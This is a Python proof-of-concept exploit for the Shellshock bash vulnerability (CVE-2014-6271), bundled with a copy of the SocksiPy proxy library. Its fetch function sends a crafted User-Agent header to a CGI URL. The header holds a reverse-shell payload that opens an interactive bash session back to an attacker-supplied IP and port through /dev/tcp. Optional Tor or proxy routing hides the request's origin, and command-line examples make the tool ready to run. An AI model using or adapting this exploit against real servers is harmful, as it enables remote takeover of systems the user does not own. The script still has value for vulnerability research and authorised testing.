#!/usr/bin/env python
# @Author: lnxg33k
# @Date:   2014-09-28 02:05:41
# @Last Modified by:   lnxg33k
# @Last Modified time: 2014-09-29 01:57:08

# POC for CVE-2014-6271 shellshock
# Thanks for Dan-Haim for the Python SOCKS module

import socket
from urllib2 import (ProxyHandler, build_opener,
                     HTTPHandler, install_opener)
import argparse
import sys

import struct
import httplib

PROXY_TYPE_SOCKS4 = 1
PROXY_TYPE_SOCKS5 = 2
PROXY_TYPE_HTTP = 3

_defaultproxy = None
_orgsocket = socket.socket

class ProxyError(Exception):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

class GeneralProxyError(ProxyError):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

class Socks5AuthError(ProxyError):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

class Socks5Error(ProxyError):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

class Socks4Error(ProxyError):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

class HTTPError(ProxyError):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

_generalerrors = ("success",
           "invalid data",
           "not connected",
           "not available",
           "bad proxy type",
           "bad input")

_socks5errors = ("succeeded",
          "general SOCKS server failure",
          "connection not allowed by ruleset",
          "Network unreachable",
          "Host unreachable",
          "Connection refused",
          "TTL expired",
          "Command not supported",
          "Address type not supported",
          "Unknown error")

_socks5autherrors = ("succeeded",
              "authentication is required",
              "all offered authentication methods were rejected",
              "unknown username or invalid password",
              "unknown error")

_socks4errors = ("request granted",
          "request rejected or failed",
          "request rejected because SOCKS server cannot connect to identd on the client",
          "request rejected because the client program and identd report different user-ids",
          "unknown error")

def setdefaultproxy(proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
    """setdefaultproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
    Sets a default proxy which all further socksocket objects will use,
    unless explicitly changed.
    """
    global _defaultproxy
    _defaultproxy = (proxytype,addr,port,rdns,username,password)

class socksocket(socket.socket):
    """socksocket([family[, type[, proto]]]) -> socket object

    Open a SOCKS enabled socket. The parameters are the same as
    those of the standard socket init. In order for SOCKS to work,
    you must specify family=AF_INET, type=SOCK_STREAM and proto=0.
    """

    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, _sock=None):
        _orgsocket.__init__(self,family,type,proto,_sock)
        if _defaultproxy != None:
            self.__proxy = _defaultproxy
        else:
            self.__proxy = (None, None, None, None, None, None)
        self.__proxysockname = None
        self.__proxypeername = None

    def __recvall(self, bytes):
        """__recvall(bytes) -> data
        Receive EXACTLY the number of bytes requested from the socket.
        Blocks until the required number of bytes have been received.
        """
        data = ""
        while len(data) < bytes:
            data = data + self.recv(bytes-len(data))
        return data

    def setproxy(self,proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
        """setproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
        Sets the proxy to be used.
        proxytype - The type of the proxy to be used. Three types
                are supported: PROXY_TYPE_SOCKS4 (including socks4a),
                PROXY_TYPE_SOCKS5 and PROXY_TYPE_HTTP
        addr -      The address of the server (IP or DNS).
        port -      The port of the server. Defaults to 1080 for SOCKS
                servers and 8080 for HTTP proxy servers.
        rdns -      Should DNS queries be preformed on the remote side
                (rather than the local side). The default is True.
                Note: This has no effect with SOCKS4 servers.
        username -  Username to authenticate with to the server.
                The default is no authentication.
        password -  Password to authenticate with to the server.
                Only relevant when username is also provided.
        """
        self.__proxy = (proxytype,addr,port,rdns,username,password)

    def __negotiatesocks5(self,destaddr,destport):
        """__negotiatesocks5(self,destaddr,destport)
        Negotiates a connection through a SOCKS5 server.
        """
        # First we'll send the authentication packages we support.
        if (self.__proxy[4]!=None) and (self.__proxy[5]!=None):
            # The username/password details were supplied to the
            # setproxy method so we support the USERNAME/PASSWORD
            # authentication (in addition to the standard none).
            self.sendall("\x05\x02\x00\x02")
        else:
            # No username/password were entered, therefore we
            # only support connections with no authentication.
            self.sendall("\x05\x01\x00")
        # We'll receive the server's response to determine which
        # method was selected
        chosenauth = self.__recvall(2)
        if chosenauth[0] != "\x05":
            self.close()
            raise GeneralProxyError((1,_generalerrors[1]))
        # Check the chosen authentication method
        if chosenauth[1] == "\x00":
            # No authentication is required
            pass
        elif chosenauth[1] == "\x02":
            # Okay, we need to perform a basic username/password
            # authentication.
            self.sendall("\x01" + chr(len(self.__proxy[4])) + self.__proxy[4] + chr(len(self.proxy[5])) + self.__proxy[5])
            authstat = self.__recvall(2)
            if authstat[0] != "\x01":
                # Bad response
                self.close()
                raise GeneralProxyError((1,_generalerrors[1]))
            if authstat[1] != "\x00":
                # Authentication failed
                self.close()
                raise Socks5AuthError,((3,_socks5autherrors[3]))
            # Authentication succeeded
        else:
            # Reaching here is always bad
            self.close()
            if chosenauth[1] == "\xFF":
                raise Socks5AuthError((2,_socks5autherrors[2]))
            else:
                raise GeneralProxyError((1,_generalerrors[1]))
        # Now we can request the actual connection
        req = "\x05\x01\x00"
        # If the given destination address is an IP address, we'll
        # use the IPv4 address request even if remote resolving was specified.
        try:
            ipaddr = socket.inet_aton(destaddr)
            req = req + "\x01" + ipaddr
        except socket.error:
            # Well it's not an IP number,  so it's probably a DNS name.
            if self.__proxy[3]==True:
                # Resolve remotely
                ipaddr = None
                req = req + "\x03" + chr(len(destaddr)) + destaddr
            else:
                # Resolve locally
                ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
                req = req + "\x01" + ipaddr
        req = req + struct.pack(">H",destport)
        self.sendall(req)
        # Get the response
        resp = self.__recvall(4)
        if resp[0] != "\x05":
            self.close()
            raise GeneralProxyError((1,_generalerrors[1]))
        elif resp[1] != "\x00":
            # Connection failed
            self.close()

        # Get the bound address/port
        elif resp[3] == "\x01":
            boundaddr = self.__recvall(4)
        elif resp[3] == "\x03":
            resp = resp + self.recv(1)
            boundaddr = self.__recvall(resp[4])
        else:
            self.close()
            raise GeneralProxyError((1,_generalerrors[1]))
        boundport = struct.unpack(">H",self.__recvall(2))[0]
        self.__proxysockname = (boundaddr,boundport)
        if ipaddr != None:
            self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
        else:
            self.__proxypeername = (destaddr,destport)

    def getproxysockname(self):
        """getsockname() -> address info
        Returns the bound IP address and port number at the proxy.
        """
        return self.__proxysockname

    def getproxypeername(self):
        """getproxypeername() -> address info
        Returns the IP and port number of the proxy.
        """
        return _orgsocket.getpeername(self)

    def getpeername(self):
        """getpeername() -> address info
        Returns the IP address and port number of the destination
        machine (note: getproxypeername returns the proxy)
        """
        return self.__proxypeername

    def __negotiatesocks4(self,destaddr,destport):
        """__negotiatesocks4(self,destaddr,destport)
        Negotiates a connection through a SOCKS4 server.
        """
        # Check if the destination address provided is an IP address
        rmtrslv = False
        try:
            ipaddr = socket.inet_aton(destaddr)
        except socket.error:
            # It's a DNS name. Check where it should be resolved.
            if self.__proxy[3]==True:
                ipaddr = "\x00\x00\x00\x01"
                rmtrslv = True
            else:
                ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
        # Construct the request packet
        req = "\x04\x01" + struct.pack(">H",destport) + ipaddr
        # The username parameter is considered userid for SOCKS4
        if self.__proxy[4] != None:
            req = req + self.__proxy[4]
        req = req + "\x00"
        # DNS name if remote resolving is required
        # NOTE: This is actually an extension to the SOCKS4 protocol
        # called SOCKS4A and may not be supported in all cases.
        if rmtrslv==True:
            req = req + destaddr + "\x00"
        self.sendall(req)
        # Get the response from the server
        resp = self.__recvall(8)
        if resp[0] != "\x00":
            # Bad data
            self.close()
            raise GeneralProxyError((1,_generalerrors[1]))
        if resp[1] != "\x5A":
            # Server returned an error
            self.close()
            if ord(resp[1]) in (91,92,93):
                self.close()
                raise Socks4Error((ord(resp[1]),_socks4errors[ord(resp[1])-90]))
            else:
                raise Socks4Error((94,_socks4errors[4]))
        # Get the bound address/port
        self.__proxysockname = (socket.inet_ntoa(resp[4:]),struct.unpack(">H",resp[2:4])[0])
        if rmtrslv != None:
            self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
        else:
            self.__proxypeername = (destaddr,destport)

    def __negotiatehttp(self,destaddr,destport):
        """__negotiatehttp(self,destaddr,destport)
        Negotiates a connection through an HTTP server.
        """
        # If we need to resolve locally, we do this now
        if self.__proxy[3] == False:
            addr = socket.gethostbyname(destaddr)
        else:
            addr = destaddr
        self.sendall("CONNECT " + addr + ":" + str(destport) + " HTTP/1.1\r\n" + "Host: " + destaddr + "\r\n\r\n")
        # We read the response until we get the string "\r\n\r\n"
        resp = self.recv(1)
        while resp.find("\r\n\r\n")==-1:
            resp = resp + self.recv(1)
        # We just need the first line to check if the connection
        # was successful
        statusline = resp.splitlines()[0].split(" ",2)
        if statusline[0] not in ("HTTP/1.0","HTTP/1.1"):
            self.close()
            raise GeneralProxyError((1,_generalerrors[1]))
        try:
            statuscode = int(statusline[1])
        except ValueError:
            self.close()
            raise GeneralProxyError((1,_generalerrors[1]))
        if statuscode != 200:
            self.close()
            raise HTTPError((statuscode,statusline[2]))
        self.__proxysockname = ("0.0.0.0",0)
        self.__proxypeername = (addr,destport)

    def connect(self,destpair):
        """connect(self,despair)
        Connects to the specified destination through a proxy.
        destpar - A tuple of the IP/DNS address and the port number.
        (identical to socket's connect).
        To select the proxy server use setproxy().
        """
        # Do a minimal input check first
        if (type(destpair) in (list,tuple)==False) or (len(destpair)<2) or (type(destpair[0])!=str) or (type(destpair[1])!=int):
            raise GeneralProxyError((5,_generalerrors[5]))
        if self.__proxy[0] == PROXY_TYPE_SOCKS5:
            if self.__proxy[2] != None:
                portnum = self.__proxy[2]
            else:
                portnum = 1080
            _orgsocket.connect(self,(self.__proxy[1],portnum))
            self.__negotiatesocks5(destpair[0],destpair[1])
        elif self.__proxy[0] == PROXY_TYPE_SOCKS4:
            if self.__proxy[2] != None:
                portnum = self.__proxy[2]
            else:
                portnum = 1080
            _orgsocket.connect(self,(self.__proxy[1],portnum))
            self.__negotiatesocks4(destpair[0],destpair[1])
        elif self.__proxy[0] == PROXY_TYPE_HTTP:
            if self.__proxy[2] != None:
                portnum = self.__proxy[2]
            else:
                portnum = 8080
            _orgsocket.connect(self,(self.__proxy[1],portnum))
            self.__negotiatehttp(destpair[0],destpair[1])
        elif self.__proxy[0] == None:
            _orgsocket.connect(self,(destpair[0],destpair[1]))
        else:
            raise GeneralProxyError((4,_generalerrors[4]))


class SocksiPyConnection(httplib.HTTPConnection):
    def __init__(self, proxytype, proxyaddr, proxyport=None, rdns=True, username=None, password=None, *args, **kwargs):
        self.proxyargs = (proxytype, proxyaddr, proxyport, rdns, username, password)
        httplib.HTTPConnection.__init__(self, *args, **kwargs)

    def connect(self):
        self.sock = socksocket()
        self.sock.setproxy(*self.proxyargs)
        if isinstance(self.timeout, float):
            self.sock.settimeout(self.timeout)
        self.sock.connect((self.host, self.port))


class SocksiPyHandler(HTTPHandler):
    def __init__(self, *args, **kwargs):
        self.args = args
        self.kw = kwargs
        HTTPHandler.__init__(self)

    def http_open(self, req):
        def build(host, port=None, strict=None, timeout=0):
            conn = SocksiPyConnection(*self.args, host=host, port=port, strict=strict, timeout=timeout, **self.kw)
            return conn
        return self.do_open(build, req)


def fetch(url, ip, port, timeout=3, verbos=False, method='get', debugLevel=0,
          proxy=False, tor=False):
    payload = "() { ignored;};/bin/bash -i >& /dev/tcp/%s/%s 0>&1" % (ip, port)
    try:
        proxy_support = ProxyHandler({'http': proxy} if proxy else {})
        opener = build_opener(
            proxy_support,
            HTTPHandler(debuglevel=debugLevel)
        )

        opener = build_opener(
            # HTTPHandler(debuglevel=level),
            SocksiPyHandler(PROXY_TYPE_SOCKS5, '127.0.0.1', 9050),
        ) if tor else opener

        # exit(opener.open('http://ifconfig.me/ip').read().strip())

        # Spoof the user-agent
        opener.addheaders = [('User-agent', payload)]

        install_opener(opener)
        # url = 'http://%s' % url if not url.startswith('http://') else url
        opener.open(url, timeout=timeout)
        # src = src.read()
        # return src
    except socket.timeout:
        if verbos:
            print "[!] Connection lost to host: %s" % url
        exit(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        add_help=False,
        usage='%(prog)s --help',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog='''
Examples:
\tpython %(prog)s --url http://mywebsite.com/cgi-bin/test.sh --ip 192.168.1.24 --port 443
\tpython %(prog)s --url http://mywebsite.com/cgi-bin/test.sh --ip 192.168.1.24 --port 443 --tor
\tpython %(prog)s --url http://mywebsite.com/cgi-bin/test.sh --ip 192.168.1.24 --port 443 --proxy http://127.0.0.1:8080
        '''
    )
    parser.add_argument('--url', dest='url', help='\t\tFull URL for the CGI script.', metavar='')
    parser.add_argument('--ip', dest='ip', help='\t\tThe IP address for the back connection.', metavar='')
    parser.add_argument('--port', dest='port', help='\t\tThe port for the back connection.', metavar='')
    parser.add_argument('--tor', dest='tor', help='\t\tUse Tor anonymity network', action='store_true')
    parser.add_argument('--proxy', dest='proxy', help='\t\tProxy (e.g. \'http://127.0.0.1:8080\')', metavar='')
    parser.add_argument('--help', action='help', help='\t\tPrint this help message then exit')
    options = parser.parse_args()
    url = options.url
    ip = options.ip
    port = options.port
    tor = options.tor
    proxy = options.proxy
    if len(sys.argv) <= 1:
        print "[!] %s --help" % sys.argv[0]
    if url and ip and port:
        fetch(url, ip=ip, port=port, tor=tor, proxy=proxy)
